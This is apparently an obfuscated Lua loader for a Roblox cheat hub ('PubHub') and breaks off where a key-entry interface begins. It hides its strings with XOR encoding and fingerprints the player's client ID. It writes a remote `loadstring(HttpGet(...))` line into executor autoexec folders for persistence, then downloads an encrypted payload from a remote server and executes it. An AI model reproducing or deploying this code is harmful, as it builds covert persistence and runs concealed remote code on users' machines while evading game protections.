local PUBHUB_API = (function()local a49Q=unpack or table.unpack;local zoDejg0yDN={3,31,31,27,24,81,68,68,27,30,9,3,30,9,70,25,30,15,15,18,69,29,14,25,8,14,7,69,10,27,27};for i=1,#zoDejg0yDN do zoDejg0yDN[i]=bit32.bxor(zoDejg0yDN[i],107) end;return string.char(a49Q(zoDejg0yDN))end)()
local MAIN_PAYLOAD_URL = PUBHUB_API .. "/payload"
local function xorDecrypt(hexData, hexKey)
    local data = {}
    for i = 1, #hexData, 2 do
        data[#data + 1] = tonumber(hexData:sub(i, i + 1), 16)
    end
    local key = {}
    for i = 1, #hexKey, 2 do
        key[#key + 1] = tonumber(hexKey:sub(i, i + 1), 16)
    end
    local out = {}
    for i = 1, #data do
        out[i] = string.char(bit32.bxor(data[i], key[(i - 1) % #key + 1]))
    end
    return table.concat(out)
end
local cloneref = cloneref or clonereference or function(x) return x end
local Players = cloneref(game:GetService((function()local Na3Ygy=unpack or table.unpack;local AW8K5773w7={59,7,10,18,14,25,24};for i=1,#AW8K5773w7 do AW8K5773w7[i]=bit32.bxor(AW8K5773w7[i],107) end;return string.char(Na3Ygy(AW8K5773w7))end)()))
local TweenService = cloneref(game:GetService((function()local tY9hnG=unpack or table.unpack;local tsGShnOIlT={63,28,14,14,5,56,14,25,29,2,8,14};for i=1,#tsGShnOIlT do tsGShnOIlT[i]=bit32.bxor(tsGShnOIlT[i],107) end;return string.char(tY9hnG(tsGShnOIlT))end)()))
local HttpService = cloneref(game:GetService((function()local wQfZq1=unpack or table.unpack;local O1JagLj4_Y={35,31,31,27,56,14,25,29,2,8,14};for i=1,#O1JagLj4_Y do O1JagLj4_Y[i]=bit32.bxor(O1JagLj4_Y[i],107) end;return string.char(wQfZq1(O1JagLj4_Y))end)()))
local RunService = cloneref(game:GetService((function()local copzzx=unpack or table.unpack;local IfPmdwbLG6={57,30,5,56,14,25,29,2,8,14};for i=1,#IfPmdwbLG6 do IfPmdwbLG6[i]=bit32.bxor(IfPmdwbLG6[i],107) end;return string.char(copzzx(IfPmdwbLG6))end)()))
local lp = Players.LocalPlayer
local function gethwid()
    local ok, id = pcall(function()
        local RbxAnalyticsService = cloneref(game:GetService((function()local MLHZ=unpack or table.unpack;local BIXFb5l={57,9,19,42,5,10,7,18,31,2,8,24,56,14,25,29,2,8,14};for i=1,#BIXFb5l do BIXFb5l[i]=bit32.bxor(BIXFb5l[i],107) end;return string.char(MLHZ(BIXFb5l))end)()))
        return RbxAnalyticsService:GetClientId()
    end)
    if ok and id and #id > 8 then return id end
    return tostring(lp.UserId) .. "-" .. string.sub(tostring(os.time()), -6)
end
local HWID = gethwid()
local function httpget(url)
    local ok, res = pcall(function()
        if http_request then return http_request({Url = url, Method = "GET"}).Body end
        if request then return request({Url = url, Method = "GET"}).Body end
        return game:HttpGet(url)
    end)
    if ok then return res end
    return nil
end
local function safejson(body)
    if not body then return nil end
    local ok, t = pcall(function() return HttpService:JSONDecode(body) end)
    return ok and t or nil
end
local KEY_FILE = "pubhub_key.txt"
local function saveKey(k)
    pcall(function()
        if writefile then writefile(KEY_FILE, k) end
    end)
end
local function loadKey()
    local ok, k = pcall(function()
        if readfile and isfile and isfile(KEY_FILE) then return readfile(KEY_FILE) end
        return nil
    end)
    if ok and k and #k > 5 then return k end
    return nil
end
local LOADER_URL = (function()local nDj_=unpack or table.unpack;local mL7FKyhQ0y={3,31,31,27,24,81,68,68,25,10,28,69,12,2,31,3,30,9,30,24,14,25,8,4,5,31,14,5,31,69,8,4,6,68,19,91,90,91,91,90,91,90,68,27,30,9,3,30,9,68,6,10,2,5,68,7,4,10,15,14,25,69,7,30,10};for i=1,#mL7FKyhQ0y do mL7FKyhQ0y[i]=bit32.bxor(mL7FKyhQ0y[i],107) end;return string.char(nDj_(mL7FKyhQ0y))end)()
local LOADER_SRC_CACHE = nil
local function fetchLoaderSrc()
    if LOADER_SRC_CACHE then return LOADER_SRC_CACHE end
    LOADER_SRC_CACHE = httpget(LOADER_URL)
    return LOADER_SRC_CACHE
end
local AUTOEXEC_MARKER = "pubhub_autoexec_v1.txt"
local function alreadyAutoexec()
    local ok, r = pcall(function()
        if readfile and isfile and isfile(AUTOEXEC_MARKER) then return readfile(AUTOEXEC_MARKER) end
    end)
    return ok and r == "1"
end
local function setupAutoexec()
    if alreadyAutoexec() then return false end
    if not writefile then return false end
    local src = fetchLoaderSrc()
    if not src or #src < 100 then return false end
    local loader_line = (function()local gcJ6Ub=unpack or table.unpack;local XMDuDTD94={7,4,10,15,24,31,25,2,5,12,67,12,10,6,14,81,35,31,31,27,44,14,31,67,73};for i=1,#XMDuDTD94 do XMDuDTD94[i]=bit32.bxor(XMDuDTD94[i],107) end;return string.char(gcJ6Ub(XMDuDTD94))end)() .. LOADER_URL .. (function()local FftUp=unpack or table.unpack;local Ytj9R_j={73,66,66,67,66};for i=1,#Ytj9R_j do Ytj9R_j[i]=bit32.bxor(Ytj9R_j[i],107) end;return string.char(FftUp(Ytj9R_j))end)()
    local paths = {
        "autoexec/pubhub.lua",
        "autoexec\\pubhub.lua",
        "auto-execute/pubhub.lua",
        "auto-execute\\pubhub.lua",
        "workspace/autoexec/pubhub.lua",
        "workspace\\autoexec\\pubhub.lua",
    }
    local wrote = false
    for _, p in ipairs(paths) do
        local ok = pcall(function() writefile(p, loader_line) end)
        if ok then wrote = true end
    end
    pcall(function() writefile(AUTOEXEC_MARKER, "1") end)
    return wrote
end
local function rejoinPlace()
    pcall(function()
        local TeleportService = game:GetService((function()local z2ZG=unpack or table.unpack;local sKXckH={63,14,7,14,27,4,25,31,56,14,25,29,2,8,14};for i=1,#sKXckH do sKXckH[i]=bit32.bxor(sKXckH[i],107) end;return string.char(z2ZG(sKXckH))end)())
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, lp)
    end)
end
local NotifGui
local function getNotifGui()
    if NotifGui and NotifGui.Parent then return NotifGui end
    NotifGui = Instance.new((function()local vtNX=unpack or table.unpack;local mIqF9u4y9={56,8,25,14,14,5,44,30,2};for i=1,#mIqF9u4y9 do mIqF9u4y9[i]=bit32.bxor(mIqF9u4y9[i],107) end;return string.char(vtNX(mIqF9u4y9))end)())
    NotifGui.Name = (function()local z0Tm=unpack or table.unpack;local JqjkGF={59,30,9,35,30,9,52,37,4,31,2,13,52};for i=1,#JqjkGF do JqjkGF[i]=bit32.bxor(JqjkGF[i],107) end;return string.char(z0Tm(JqjkGF))end)() .. HttpService:GenerateGUID(false):sub(1, 8)
    NotifGui.ResetOnSpawn = false
    NotifGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    NotifGui.DisplayOrder = 1000
    NotifGui.Parent = gethui()
    return NotifGui
end
local function Notify(text, ok)
    task.spawn(function()
        local gui = getNotifGui()
        for _, c in ipairs(gui:GetChildren()) do
            if c:IsA((function()local SyoPI=unpack or table.unpack;local Pd5aYtWm={45,25,10,6,14};for i=1,#Pd5aYtWm do Pd5aYtWm[i]=bit32.bxor(Pd5aYtWm[i],107) end;return string.char(SyoPI(Pd5aYtWm))end)()) then
                local curY = c.Position.Y.Offset
                TweenService:Create(c, TweenInfo.new(0.3), {Position = UDim2.new(1, -320, 1, curY - 70)}):Play()
            end
        end
        local Frame = Instance.new((function()local dK7_=unpack or table.unpack;local QkI2DqB={45,25,10,6,14};for i=1,#QkI2DqB do QkI2DqB[i]=bit32.bxor(QkI2DqB[i],107) end;return string.char(dK7_(QkI2DqB))end)())
        Frame.Size = UDim2.fromOffset(300, 60)
        Frame.Position = UDim2.new(1, 320, 1, -80)
        Frame.BackgroundColor3 = Color3.fromRGB(18, 20, 34)
        Frame.BorderSizePixel = 0
        Frame.Parent = gui
        local FC = Instance.new((function()local nI6q=unpack or table.unpack;local S1tWhDNhS={62,34,40,4,25,5,14,25};for i=1,#S1tWhDNhS do S1tWhDNhS[i]=bit32.bxor(S1tWhDNhS[i],107) end;return string.char(nI6q(S1tWhDNhS))end)()) FC.CornerRadius = UDim.new(0, 12) FC.Parent = Frame
        local FS = Instance.new((function()local MUWj=unpack or table.unpack;local PAV23zp={62,34,56,31,25,4,0,14};for i=1,#PAV23zp do PAV23zp[i]=bit32.bxor(PAV23zp[i],107) end;return string.char(MUWj(PAV23zp))end)())
        FS.Color = ok == false and Color3.fromRGB(248, 113, 113) or Color3.fromRGB(139, 92, 246)
        FS.Thickness = 2
        FS.Parent = Frame
        local Label = Instance.new((function()local BNOuvo=unpack or table.unpack;local WHN4eS={63,14,19,31,39,10,9,14,7};for i=1,#WHN4eS do WHN4eS[i]=bit32.bxor(WHN4eS[i],107) end;return string.char(BNOuvo(WHN4eS))end)())
        Label.Size = UDim2.new(1, -20, 1, 0)
        Label.Position = UDim2.fromOffset(10, 0)
        Label.BackgroundTransparency = 1
        Label.Font = Enum.Font.GothamBold
        Label.TextSize = 13
        Label.Text = text
        Label.TextColor3 = Color3.fromRGB(226, 232, 240)
        Label.TextWrapped = true
        Label.TextXAlignment = Enum.TextXAlignment.Left
        Label.Parent = Frame
        TweenService:Create(Frame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Position = UDim2.new(1, -320, 1, -80)
        }):Play()
        task.wait(3)
        TweenService:Create(Frame, TweenInfo.new(0.3), {Position = UDim2.new(1, 320, 1, -80)}):Play()
        task.wait(0.35)
        Frame:Destroy()
    end)
end
pcall(function()
    local g = getgenv and getgenv() or _G
    if g.__PUBHUB_GUI then pcall(function() g.__PUBHUB_GUI:Destroy() end) end
    if g.__PUBHUB_CLEAN then pcall(g.__PUBHUB_CLEAN) end
end)
local function gethui()
    local genv = (getgenv and getgenv()) or _G
    if type(genv.gethui) == (function()local fnOZk=unpack or table.unpack;local vzjAYGC={13,30,5,8,31,2,4,5};for i=1,#vzjAYGC do vzjAYGC[i]=bit32.bxor(vzjAYGC[i],107) end;return string.char(fnOZk(vzjAYGC))end)() then
        local ok, r = pcall(genv.gethui)
        if ok and r then return r end
    end
    local ok2, cg = pcall(function() return cloneref(game:GetService((function()local l21JfQ=unpack or table.unpack;local sfmxohzMwL={40,4,25,14,44,30,2};for i=1,#sfmxohzMwL do sfmxohzMwL[i]=bit32.bxor(sfmxohzMwL[i],107) end;return string.char(l21JfQ(sfmxohzMwL))end)())) end)
    if ok2 and cg then return cg end
    return lp:WaitForChild((function()local qI63X=unpack or table.unpack;local KftgN9e0={59,7,10,18,14,25,44,30,2};for i=1,#KftgN9e0 do KftgN9e0[i]=bit32.bxor(KftgN9e0[i],107) end;return string.char(qI63X(KftgN9e0))end)())
end
local SplashGui = Instance.new((function()local zis5c=unpack or table.unpack;local iRPUFzrXC={56,8,25,14,14,5,44,30,2};for i=1,#iRPUFzrXC do iRPUFzrXC[i]=bit32.bxor(iRPUFzrXC[i],107) end;return string.char(zis5c(iRPUFzrXC))end)())
SplashGui.Name = (function()local KPz3=unpack or table.unpack;local g7c5wHOd={59,30,9,35,30,9,52};for i=1,#g7c5wHOd do g7c5wHOd[i]=bit32.bxor(g7c5wHOd[i],107) end;return string.char(KPz3(g7c5wHOd))end)() .. HttpService:GenerateGUID(false):sub(1, 8)
SplashGui.ResetOnSpawn = false
SplashGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
SplashGui.DisplayOrder = 999
SplashGui.Parent = gethui()
getgenv().__PUBHUB_GUI = SplashGui
local SplashFrame = Instance.new((function()local BxRG=unpack or table.unpack;local iBMSXI20={45,25,10,6,14};for i=1,#iBMSXI20 do iBMSXI20[i]=bit32.bxor(iBMSXI20[i],107) end;return string.char(BxRG(iBMSXI20))end)())
SplashFrame.Size = UDim2.fromOffset(360, 220)
SplashFrame.Position = UDim2.fromScale(0.5, 0.5)
SplashFrame.AnchorPoint = Vector2.new(0.5, 0.5)
SplashFrame.BackgroundColor3 = Color3.fromRGB(12, 14, 24)
SplashFrame.BorderSizePixel = 0
SplashFrame.Parent = SplashGui
local SplashCorner = Instance.new((function()local zaNXdA=unpack or table.unpack;local i0rThMWocG={62,34,40,4,25,5,14,25};for i=1,#i0rThMWocG do i0rThMWocG[i]=bit32.bxor(i0rThMWocG[i],107) end;return string.char(zaNXdA(i0rThMWocG))end)())
SplashCorner.CornerRadius = UDim.new(0, 16)
SplashCorner.Parent = SplashFrame
local SplashStroke = Instance.new((function()local FW298=unpack or table.unpack;local ZkC5caf2Sa={62,34,56,31,25,4,0,14};for i=1,#ZkC5caf2Sa do ZkC5caf2Sa[i]=bit32.bxor(ZkC5caf2Sa[i],107) end;return string.char(FW298(ZkC5caf2Sa))end)())
SplashStroke.Color = Color3.fromRGB(139, 92, 246)
SplashStroke.Thickness = 2
SplashStroke.Transparency = 0
SplashStroke.Parent = SplashFrame
local SplashGradient = Instance.new((function()local Ky0JV=unpack or table.unpack;local jJ4TKr0={62,34,44,25,10,15,2,14,5,31};for i=1,#jJ4TKr0 do jJ4TKr0[i]=bit32.bxor(jJ4TKr0[i],107) end;return string.char(Ky0JV(jJ4TKr0))end)())
SplashGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 16, 36)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 10, 18)),
})
SplashGradient.Rotation = 45
SplashGradient.Parent = SplashFrame
local Logo = Instance.new((function()local GqeKA=unpack or table.unpack;local DXVOAE={63,14,19,31,39,10,9,14,7};for i=1,#DXVOAE do DXVOAE[i]=bit32.bxor(DXVOAE[i],107) end;return string.char(GqeKA(DXVOAE))end)())
Logo.Size = UDim2.fromOffset(200, 50)
Logo.Position = UDim2.fromScale(0.5, 0.35)
Logo.AnchorPoint = Vector2.new(0.5, 0.5)
Logo.BackgroundTransparency = 1
Logo.Font = Enum.Font.GothamBold
Logo.TextSize = 36
Logo.Text = (function()local kG3c=unpack or table.unpack;local MYCRVfY={59,30,9,35,30,9};for i=1,#MYCRVfY do MYCRVfY[i]=bit32.bxor(MYCRVfY[i],107) end;return string.char(kG3c(MYCRVfY))end)()
Logo.TextColor3 = Color3.fromRGB(255, 255, 255)
Logo.TextTransparency = 1
Logo.Parent = SplashFrame
local LogoGrad = Instance.new((function()local _1rIbl=unpack or table.unpack;local bZuBz38={62,34,44,25,10,15,2,14,5,31};for i=1,#bZuBz38 do bZuBz38[i]=bit32.bxor(bZuBz38[i],107) end;return string.char(_1rIbl(bZuBz38))end)())
LogoGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(139, 92, 246)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(236, 72, 153)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(59, 130, 246)),
})
LogoGrad.Parent = Logo
local Subtitle = Instance.new((function()local Uj8tOp=unpack or table.unpack;local ri7Wozt4={63,14,19,31,39,10,9,14,7};for i=1,#ri7Wozt4 do ri7Wozt4[i]=bit32.bxor(ri7Wozt4[i],107) end;return string.char(Uj8tOp(ri7Wozt4))end)())
Subtitle.Size = UDim2.fromOffset(280, 20)
Subtitle.Position = UDim2.fromScale(0.5, 0.55)
Subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
Subtitle.BackgroundTransparency = 1
Subtitle.Font = Enum.Font.Gotham
Subtitle.TextSize = 13
Subtitle.Text = (function()local ScNT=unpack or table.unpack;local eI0SNTiIh={59,25,14,6,2,30,6,75,56,8,25,2,27,31,75,35,30,9};for i=1,#eI0SNTiIh do eI0SNTiIh[i]=bit32.bxor(eI0SNTiIh[i],107) end;return string.char(ScNT(eI0SNTiIh))end)()
Subtitle.TextColor3 = Color3.fromRGB(156, 163, 175)
Subtitle.TextTransparency = 1
Subtitle.Parent = SplashFrame
local BarBg = Instance.new((function()local hP90qH=unpack or table.unpack;local eBDzBkGEEK={45,25,10,6,14};for i=1,#eBDzBkGEEK do eBDzBkGEEK[i]=bit32.bxor(eBDzBkGEEK[i],107) end;return string.char(hP90qH(eBDzBkGEEK))end)())
BarBg.Size = UDim2.fromOffset(280, 6)
BarBg.Position = UDim2.fromScale(0.5, 0.78)
BarBg.AnchorPoint = Vector2.new(0.5, 0.5)
BarBg.BackgroundColor3 = Color3.fromRGB(28, 30, 46)
BarBg.BorderSizePixel = 0
BarBg.Parent = SplashFrame
local BarBgCorner = Instance.new((function()local WNMhUT=unpack or table.unpack;local zMS_6B={62,34,40,4,25,5,14,25};for i=1,#zMS_6B do zMS_6B[i]=bit32.bxor(zMS_6B[i],107) end;return string.char(WNMhUT(zMS_6B))end)())
BarBgCorner.CornerRadius = UDim.new(1, 0)
BarBgCorner.Parent = BarBg
local Bar = Instance.new((function()local Niuvv=unpack or table.unpack;local xzJeGG={45,25,10,6,14};for i=1,#xzJeGG do xzJeGG[i]=bit32.bxor(xzJeGG[i],107) end;return string.char(Niuvv(xzJeGG))end)())
Bar.Size = UDim2.fromOffset(0, 6)
Bar.BackgroundColor3 = Color3.fromRGB(139, 92, 246)
Bar.BorderSizePixel = 0
Bar.Parent = BarBg
local BarCorner = Instance.new((function()local Dkxdz=unpack or table.unpack;local c6Ump59={62,34,40,4,25,5,14,25};for i=1,#c6Ump59 do c6Ump59[i]=bit32.bxor(c6Ump59[i],107) end;return string.char(Dkxdz(c6Ump59))end)())
BarCorner.CornerRadius = UDim.new(1, 0)
BarCorner.Parent = Bar
local BarGrad = Instance.new((function()local PVBxf=unpack or table.unpack;local ryTuI5={62,34,44,25,10,15,2,14,5,31};for i=1,#ryTuI5 do ryTuI5[i]=bit32.bxor(ryTuI5[i],107) end;return string.char(PVBxf(ryTuI5))end)())
BarGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(139, 92, 246)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(236, 72, 153)),
})
BarGrad.Parent = Bar
local Status = Instance.new((function()local koxeY=unpack or table.unpack;local WuK1ve3iC={63,14,19,31,39,10,9,14,7};for i=1,#WuK1ve3iC do WuK1ve3iC[i]=bit32.bxor(WuK1ve3iC[i],107) end;return string.char(koxeY(WuK1ve3iC))end)())
Status.Size = UDim2.fromOffset(280, 16)
Status.Position = UDim2.fromScale(0.5, 0.9)
Status.AnchorPoint = Vector2.new(0.5, 0.5)
Status.BackgroundTransparency = 1
Status.Font = Enum.Font.Gotham
Status.TextSize = 11
Status.Text = "Initializing..."
Status.TextColor3 = Color3.fromRGB(107, 114, 128)
Status.TextTransparency = 1
Status.Parent = SplashFrame
task.spawn(function()
    SplashFrame.Size = UDim2.fromOffset(280, 170)
    TweenService:Create(SplashFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.fromOffset(360, 220)
    }):Play()
    TweenService:Create(Logo, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
    task.wait(0.2)
    TweenService:Create(Subtitle, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
    TweenService:Create(Status, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
    task.spawn(function()
        while SplashFrame.Parent do
            TweenService:Create(LogoGrad, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                Offset = Vector2.new(1, 0)
            }):Play()
            task.wait(1.2)
            TweenService:Create(LogoGrad, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                Offset = Vector2.new(-1, 0)
            }):Play()
            task.wait(1.2)
        end
    end)
    local steps = {
        {0.2, (function()local VJ4kR=unpack or table.unpack;local zOXuVu={40,3,14,8,0,2,5,12,75,14,19,14,8,30,31,4,25,69,69,69};for i=1,#zOXuVu do zOXuVu[i]=bit32.bxor(zOXuVu[i],107) end;return string.char(VJ4kR(zOXuVu))end)()},
        {0.5, (function()local sdDF=unpack or table.unpack;local C_kgA_U7={40,4,5,5,14,8,31,2,5,12,75,31,4,75,59,30,9,35,30,9,69,69,69};for i=1,#C_kgA_U7 do C_kgA_U7[i]=bit32.bxor(C_kgA_U7[i],107) end;return string.char(sdDF(C_kgA_U7))end)()},
        {0.8, (function()local wpnM=unpack or table.unpack;local JQv1HNu={61,14,25,2,13,18,2,5,12,75,35,60,34,47,69,69,69};for i=1,#JQv1HNu do JQv1HNu[i]=bit32.bxor(JQv1HNu[i],107) end;return string.char(wpnM(JQv1HNu))end)()},
        {1.0, (function()local fvLiR=unpack or table.unpack;local bdXHT4vK={57,14,10,15,18};for i=1,#bdXHT4vK do bdXHT4vK[i]=bit32.bxor(bdXHT4vK[i],107) end;return string.char(fvLiR(bdXHT4vK))end)()},
    }
    for _, s in ipairs(steps) do
        TweenService:Create(Bar, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
            Size = UDim2.fromOffset(280 * s[1], 6)
        }):Play()
        Status.Text = s[2]
        task.wait(0.4)
    end
    task.wait(0.3)
    TweenService:Create(SplashFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
        Size = UDim2.fromOffset(340, 200),
        BackgroundTransparency = 1
    }):Play()
    for _, d in ipairs(SplashFrame:GetDescendants()) do
        if d:IsA((function()local o4GzvK=unpack or table.unpack;local r7TK06={44,30,2,36,9,1,14,8,31};for i=1,#r7TK06 do r7TK06[i]=bit32.bxor(r7TK06[i],107) end;return string.char(o4GzvK(r7TK06))end)()) then
            pcall(function()
                TweenService:Create(d, TweenInfo.new(0.35), {Transparency = 1}):Play()
            end)
            if d:IsA((function()local L4lOev=unpack or table.unpack;local CdOcV0lQ={63,14,19,31,39,10,9,14,7};for i=1,#CdOcV0lQ do CdOcV0lQ[i]=bit32.bxor(CdOcV0lQ[i],107) end;return string.char(L4lOev(CdOcV0lQ))end)()) or d:IsA((function()local XIMoS=unpack or table.unpack;local kcQr07={63,14,19,31,41,30,31,31,4,5};for i=1,#kcQr07 do kcQr07[i]=bit32.bxor(kcQr07[i],107) end;return string.char(XIMoS(kcQr07))end)()) or d:IsA((function()local q22BQi=unpack or table.unpack;local sT9UBiZqj={63,14,19,31,41,4,19};for i=1,#sT9UBiZqj do sT9UBiZqj[i]=bit32.bxor(sT9UBiZqj[i],107) end;return string.char(q22BQi(sT9UBiZqj))end)()) then
                TweenService:Create(d, TweenInfo.new(0.35), {TextTransparency = 1}):Play()
            end
        end
    end
    TweenService:Create(SplashStroke, TweenInfo.new(0.35), {Transparency = 1}):Play()
    task.wait(0.45)
    SplashFrame:Destroy()
end)
task.wait(1.8)
print((function()local OH6xg=unpack or table.unpack;local VULDmsNuz7={48,59,30,9,35,30,9,54,75,56,27,7,10,24,3,75,15,4,5,14,71,75,8,3,14,8,0,2,5,12,75,24,10,29,14,15,75,0,14,18,69,69,69};for i=1,#VULDmsNuz7 do VULDmsNuz7[i]=bit32.bxor(VULDmsNuz7[i],107) end;return string.char(OH6xg(VULDmsNuz7))end)())
local SKIP_GUI = false
do
    local saved = loadKey()
    if saved then
        local url = string.format((function()local i7Nlel=unpack or table.unpack;local _S2_TsvSF={78,24,68,8,3,14,8,0,84,0,14,18,86,78,24,77,3,28,86,78,24};for i=1,#_S2_TsvSF do _S2_TsvSF[i]=bit32.bxor(_S2_TsvSF[i],107) end;return string.char(i7Nlel(_S2_TsvSF))end)(), PUBHUB_API,
            HttpService:UrlEncode(saved), HttpService:UrlEncode(HWID))
        local body = httpget(url)
        local data = safejson(body)
        if data and data.valid then
            print((function()local sb3Kg=unpack or table.unpack;local yHwjuW65t={48,59,30,9,35,30,9,54,75,56,10,29,14,15,75,0,14,18,75,29,10,7,2,15,75,137,235,255,75,10,30,31,4,70,7,4,12,2,5,71,75};for i=1,#yHwjuW65t do yHwjuW65t[i]=bit32.bxor(yHwjuW65t[i],107) end;return string.char(sb3Kg(yHwjuW65t))end)() .. math.floor((data.remaining or 0)/3600) .. (function()local mLWh7x=unpack or table.unpack;local VRdyFJMQ={3,75,7,14,13,31};for i=1,#VRdyFJMQ do VRdyFJMQ[i]=bit32.bxor(VRdyFJMQ[i],107) end;return string.char(mLWh7x(VRdyFJMQ))end)())
            VALIDATED = true
            KEY_DATA = data
            SKIP_GUI = true
            pcall(function()
                (getgenv and getgenv() or _G).__PUBHUB_KEY = { ExpiresAt = data.expires_at, Hours = data.hours }
            end)
            pcall(function() SplashGui:Destroy() end)
            if not alreadyAutoexec() then
                local wrote = setupAutoexec()
                if wrote then
                    print((function()local jSSl=unpack or table.unpack;local oiPh68={48,59,30,9,35,30,9,54,75,42,30,31,4,70,14,19,14,8,75,2,5,24,31,10,7,7,14,15,75,137,235,255,75,25,14,1,4,2,5,2,5,12,75,13,4,25,75,14,10,25,7,18,75,2,5,1,14,8,31};for i=1,#oiPh68 do oiPh68[i]=bit32.bxor(oiPh68[i],107) end;return string.char(jSSl(oiPh68))end)())
                    Notify((function()local y9Wt=unpack or table.unpack;local nohDIR4={42,30,31,4,70,14,19,14,8,75,186,232,186,234,186,233,187,219,187,214,187,213,187,217,187,208,187,222,187,214,75,137,235,255,75,187,212,187,222,186,235,187,222,187,220,187,219,186,238,187,213,187,223,187,211,187,215};for i=1,#nohDIR4 do nohDIR4[i]=bit32.bxor(nohDIR4[i],107) end;return string.char(y9Wt(nohDIR4))end)(), true)
                    task.wait(1.5)
                    rejoinPlace()
                    return
                end
            end
            local payloadUrl = string.format((function()local WTYe5=unpack or table.unpack;local IMQ7hlDj8={78,24,84,0,14,18,86,78,24,77,3,28,86,78,24};for i=1,#IMQ7hlDj8 do IMQ7hlDj8[i]=bit32.bxor(IMQ7hlDj8[i],107) end;return string.char(WTYe5(IMQ7hlDj8))end)(), MAIN_PAYLOAD_URL,
                HttpService:UrlEncode(saved), HttpService:UrlEncode(HWID))
            local body = httpget(payloadUrl)
            if body then
                local data2 = safejson(body)
                if data2 and data2.data and data2.k then
                    local src = xorDecrypt(data2.data, data2.k)
                    local coreSize = data2.core_size or 0
                    local coreSrc = src:sub(1, coreSize)
                    local mainSrc = src:sub(coreSize + 2)
                    local coreFn, coreErr = loadstring(coreSrc)
                    if coreFn then
                        pcall(coreFn)
                    else
                        warn((function()local cC_YH=unpack or table.unpack;local _h97zg3p={48,59,30,9,35,30,9,54,75,40,4,25,14,75,7,4,10,15,75,14,25,25,4,25,81,75};for i=1,#_h97zg3p do _h97zg3p[i]=bit32.bxor(_h97zg3p[i],107) end;return string.char(cC_YH(_h97zg3p))end)() .. tostring(coreErr))
                    end
                    local fn, err = loadstring(mainSrc)
                    if fn then
                        Notify((function()local RZZy=unpack or table.unpack;local qlfU6w={60,14,7,8,4,6,14,75,9,10,8,0,74,75};for i=1,#qlfU6w do qlfU6w[i]=bit32.bxor(qlfU6w[i],107) end;return string.char(RZZy(qlfU6w))end)() .. math.floor((data.remaining or 0)/3600) .. (function()local Zq0B=unpack or table.unpack;local O_IjNowNzK={3,75,7,14,13,31};for i=1,#O_IjNowNzK do O_IjNowNzK[i]=bit32.bxor(O_IjNowNzK[i],107) end;return string.char(Zq0B(O_IjNowNzK))end)(), true)
                        print((function()local JmCw=unpack or table.unpack;local OlD2xKe={48,59,30,9,35,30,9,54,75,10,30,31,4,70,7,4,12,2,5,81,75,14,19,14,8,30,31,2,5,12,75,27,10,18,7,4,10,15};for i=1,#OlD2xKe do OlD2xKe[i]=bit32.bxor(OlD2xKe[i],107) end;return string.char(JmCw(OlD2xKe))end)())
                        local ok2, runerr = pcall(fn)
                        if not ok2 then warn((function()local TcIUSh=unpack or table.unpack;local p0_5US5yz={48,59,30,9,35,30,9,54,75,10,30,31,4,70,7,4,12,2,5,75,25,30,5,31,2,6,14,75,14,25,25,4,25,81,75};for i=1,#p0_5US5yz do p0_5US5yz[i]=bit32.bxor(p0_5US5yz[i],107) end;return string.char(TcIUSh(p0_5US5yz))end)() .. tostring(runerr)) end
                    else
                        warn((function()local bPQ8=unpack or table.unpack;local NySoDp={48,59,30,9,35,30,9,54,75,59,10,18,7,4,10,15,75,7,4,10,15,75,14,25,25,4,25,81,75};for i=1,#NySoDp do NySoDp[i]=bit32.bxor(NySoDp[i],107) end;return string.char(bPQ8(NySoDp))end)() .. tostring(err))
                    end
                else
                    warn((function()local s1Py=unpack or table.unpack;local YwaMBhF={48,59,30,9,35,30,9,54,75,41,10,15,75,27,10,18,7,4,10,15,75,25,14,24,27,4,5,24,14};for i=1,#YwaMBhF do YwaMBhF[i]=bit32.bxor(YwaMBhF[i],107) end;return string.char(s1Py(YwaMBhF))end)())
                end
            else
                warn((function()local aPMdr6=unpack or table.unpack;local XtNjBFUcz2={48,59,30,9,35,30,9,54,75,45,10,2,7,14,15,75,31,4,75,13,14,31,8,3,75,6,10,2,5,75,27,10,18,7,4,10,15};for i=1,#XtNjBFUcz2 do XtNjBFUcz2[i]=bit32.bxor(XtNjBFUcz2[i],107) end;return string.char(aPMdr6(XtNjBFUcz2))end)())
            end
            return
        else
            print((function()local cQjbF=unpack or table.unpack;local nC0lsxwHTV={48,59,30,9,35,30,9,54,75,56,10,29,14,15,75,0,14,18,75,14,19,27,2,25,14,15,68,2,5,29,10,7,2,15,75,137,235,255,75,24,3,4,28,2,5,12,75,0,14,18,75,28,2,5,15,4,28};for i=1,#nC0lsxwHTV do nC0lsxwHTV[i]=bit32.bxor(nC0lsxwHTV[i],107) end;return string.char(cQjbF(nC0lsxwHTV))end)())
        end
    end
end
local KeyGui = Instance.new((function()local iAT6pr=unpack or table.unpack;local eeKs26UX0N={56,8,25,14,14,5,44,30,2};for i=1,#eeKs26UX0N do eeKs26UX0N[i]=bit32.bxor(eeKs26UX0N[i],107) end;return string.char(iAT6pr(eeKs26UX0N))end)())
